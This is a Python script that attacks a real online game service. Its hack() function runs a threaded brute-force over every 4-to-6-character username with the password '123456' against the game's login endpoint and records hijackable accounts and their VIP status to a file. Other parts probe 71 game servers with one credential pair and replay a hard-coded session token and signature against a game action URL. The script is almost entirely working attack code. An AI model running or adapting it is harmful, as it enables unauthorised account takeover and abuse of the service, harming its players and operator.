import requests, json, itertools,threading,random
def check_user(item,file,record,counter,url,login_url):
    print(item)
    u = "".join(list(item))
    res = requests.post(url.format(random.randint,u)).content.decode()
    status = int(json.loads(res)['status'])
    if status == 1:
        res = requests.post(login_url.format(random,u))
        vip = json.loads(res.content.decode())['vip']
        file.write(u + " " + "123456 " + str(vip) + " \n")
        file.flush()
    elif status == -2:
        file.write(u + "\n")
        file.flush()
    if counter % 10000 == 0:
        record.write(str(counter) + "\n")
        record.flush()
def hack():
    url = "http://uc.game.baozouwushuang.com/index.php?&c=user&m=login&&token=&channel=9&lang=zh-cn&rand{}=&u={}&p=123456"
    pool = "1234567890abcdefghijklmnopqrstuvwxyz"
    login_url = "http://bzws-s32.game.zhanyougame.com/index.php?v=0&c=login&&m=user&&token=&channel=9&lang=zh-cn&rand={}&u={}&p=123456"
    file = open("hack.txt", 'w')
    record = open("record.txt", "w")
    counter = 0
    for i in range(4, 7):

        for item in itertools.product(pool, repeat=i):
            t = threading.Thread(target=check_user,args=(item,file,record,counter,url,login_url))
            t.start()
            counter += 1
def get_content(password,user,id):
    r = requests.post(
        "http://s"+str(id)+".game.baozouwushuang.com/index.php?v=0&c=login&m=user&token=&channel=9&lang=zh-cn&mac=155098868678924&devicetoken=000000&u="+user+"&p="+password+"&adid&channel=9&token=")
    content = r.content.decode()
    content = json.loads(content)
    return content
def login():
    for i in range(1,72):
        content = get_content("1bb1","123456",i)
        if int(content['status']) != -1:
            print("this server: {}".format(i))
            print(content)
def crack_password(u):
    url = "http://uc.game.baozouwushuang.com/index.php?&c=user&m=login&&token=&channel=9&lang=zh-cn&rand=158862535321135&u={}&p=123456"
    pool = "1234567890abcdefghijklmnopqrstuvwxyz"

if __name__ == "__main__":

    url = "http://bzws-s32.game.zhanyougame.com/index.php?v=0&c=map&&m=action&&token_uid=31973&token=KXf4WBcWOMWar277lMcvBg&channel=9&lang=zh-cn&rand=1624649409&signature=2af0a3f9706b050580a5f3a87c341e5c&l=20&s=4&id=3"
    for i in range(300):
        content = json.loads(requests.post(url).content.decode())
        print(content)
        if content['info']['win'] > 0:
            print("good job")
            break
